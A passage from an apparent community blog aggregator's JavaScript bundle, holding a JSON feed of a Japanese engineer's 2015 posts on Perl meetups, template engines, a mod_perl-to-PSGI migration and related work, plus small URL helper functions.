ATNDatnd.org今回はPerlとPerl以外ということで、Perlの外の世界をつないでるもので一番最初に思いついたのがテンプレートエンジンだったので今回の発表になりました。自分のテンプレートの利用シーンは設定ファイルの自動生成ですね。テンプレートがあることで手作業で設定ファイルをいじる必要が基本的にはないので、手作業に起因ミスがないのが良いですよね。そのほかくりかえしの記述が必要なものもテンプレート使うと便利な場面が多いと思います。前回のLTが長すぎたので、真姫進行で行ったら、巻きすぎてしまいました。時間配分難しい。#kichijojipm 真姫すぎた。。— masasuzu? (@masasuz) July 10, 2015#kichijojipm 巻きすぎた。。— masasuzu? (@masasuz) July 10, 2015懇親会のお店はおしゃれな感じでさすが吉祥寺という感じでした。五反田とは違う。#kichijojipm 炙りマカレル pic.twitter.com/wpJTTnIvZF— masasuzu? (@masasuz) July 10, 2015他の人のスライドはこちらページからたどれると思います。吉祥寺.pm4終わりました - kichijojipm’s blogkichijojipm.hatenablog.com今回の吉祥寺.pmも楽しかったです。次回も参加したいです。余談1今回のKeynoteはAzusa Colorsを元にスライドを作りました。だいぶ良い感じにできました。ありがたいです。茜屋さんのイメージカラーのパープルを基調にしています。http://memo.sanographix.net/post/113681262780memo.sanographix.net余談2LTの途中で宣伝してましたが、五反田のモバイルファクトリーさんで7/31にCrystalの勉強会やるしいですよ。東京 Crystal 勉強会 #1 in 五反田 (2015/07/31 19:30〜)crystal.connpass.comGotandaは今技術的に熱い街です。そのほかGotanda.pmや五反田Perlみたいな勉強会も様々行われてます。","isoDate":"2015-07-12T03:20:11.000Z","dateMiliSeconds":1436671211000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-07-10-kichijoji.pm4_yurui_template","link":"https://speakerdeck.com/masasuzu/2015-07-10-kichijoji-dot-pm4-yurui-template","contentSnippet":"テンプレートとPerlに関するゆるい話\\r\\r吉祥寺.pm #4","isoDate":"2015-07-10T04:00:00.000Z","dateMiliSeconds":1436500800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015年第二 四半期をふりかえる","link":"https://blog.masasuzu.net/entry/2015/07/03/2015_2_retrospective","contentSnippet":"7月にとうとうなりました。ざっくりふり返ります。お仕事mod_perl to PSGI/Plackこの四半期のメインタスクでした。弊社2事業部あるんですが、そのうちの片方の事業部のmod_perlアプリをPSGI/Plack化しました。後は事業部の人がちゃんとテストして、本番反映するだけです。もう一個の事業部のmod_perlアプリケーションは次の四半期に取りかかる予定です。雑感としては、mod_perl特有の機能はほぼ使ってないので、そんなに辛くは無かったです。どちらかというと、使っているモジュールが古すぎたり、SledgeのPlugin地獄だったりしてアプリの実装の方でちょこちょこはまることが多かったです。このあたりの話です。#gotandapm Gotanda.pm Perl Technology Conference #4 話してきた話 - 目の前に僕らの道があるmasasuzu.hatenablog.jpGitbucket地味にアップデートが出る度に追従してました。しかしながら、そこそこでかいレポジトリをGitbucketで管理するのはだいぶつらいことが見えてきました。まず、レポジトリブラウザが鬼のように重い。1日数10コミットするようなレポジトリだとまともに使えないので、ちょっと移行先を考えてます。Elasticsearch  + Kibana4Kibana4入れました。Kibana3もまだ稼働中ですが、Kibana4で十分かなという気分です。Kibana4はすごい便利なので、そのあたりの話もどこかで一度したいです。開発環境の改善OrePAN2::Serverを廃止して、社内モジュールは静的サーバ置いたり、一つサーバでマルチユーザが同居するようなレガシーな開発環境の改善とかもろもろやってました。この辺もあとでエントリ書きたいところ。新卒技術者のメンタリング新卒技術者に対して仕事外で困ってる事とかのお悩みの相談乗ったり、成長を促すお手伝いをしたいたりします。会社としてもメンター制度できたばっかりで、組織的にも自分的にもいろいろ手探り感があるのは確かです。自分が見ている人はかなり優秀で日々成長が見て取れるので、そこをさらに促せるようにしていけたらと思います。書いた記事こう見るとあまりエントリ残してないですね。もう少し書きたいところ。4月勉強会#kichijojipm 吉祥寺.pm #3 に参加してきました。 - 目の前に僕らの道がある技術ubuntu12.04でruby2.2.1のビルド失敗するのはlibffi-devが入ってないから - ふり返る暇なんて無いね$PATHを見やすく表示したい - ふり返る暇なんて無いね5月技術ポートが空いてるか調べたいとき - ふり返る暇なんて無いねサーバ起動時に/etc/init.d/ に設定があるデーモンを自動起動したい - ふり返る暇なんて無いねElasticsearchを1.4以上に上げたらkibana3がElasticsearchにConnection Failedする際の対処 - ふり返る暇なんて無いねポエム縮退運用という考え方 - ふり返る暇なんて無いねあなたは嫌いですか。でも僕は好きです。 - ふり返る暇なんて無いね6月勉強会#gotandapm Gotanda.pm Perl Technology Conference #5 でLTの高速化に失敗しました - 目の前に僕らの道がある技術MySQLのLINEAR KEY パーティションでPKで検索しても遅い場合 - ふり返る暇なんて無いねPerlモジュールのバージョン比較したい - ふり返る暇なんて無いねポエム普段の行動がものをいう - ふり返る暇なんて無いね判断と判断の変更 - ふり返る暇なんて無いね感覚値はあくまで感覚値 - ふり返る暇なんて無いね次の四半期お仕事的にはもう一個の事業部のPSGI/Plack化と開発環境の改善をメインにやってくと思います。ここ最近ちょっといろいろ腹に貯めすぎなので、もう少し心にゆとりをもっていけたらなとは思いまする。","isoDate":"2015-07-03T00:00:00.000Z","dateMiliSeconds":1435881600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-06-25_gotanda.pm5","link":"https://speakerdeck.com/masasuzu/2015-06-25-gotanda-dot-pm5","contentSnippet":"Plackのアクセスログの話","isoDate":"2015-06-24T04:00:00.000Z","dateMiliSeconds":1435118400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"}]')},7542:(e,t,o)=>{o.d(t,{M8:()=>r,kR:()=>n,mr:()=>s,nv:()=>i});var a=o(1202);function i(e){return a.o.find(t=>t.id===e)}function r(e){let t=new URL(e);return(null==t?void 0:t.hostname)||"blog"}function n(e){return"https://www.google.com/s2/favicons?domain=".concat(e)}function s(e){return"/members/".concat(encodeURIComponent(e))}o(6067)}}]);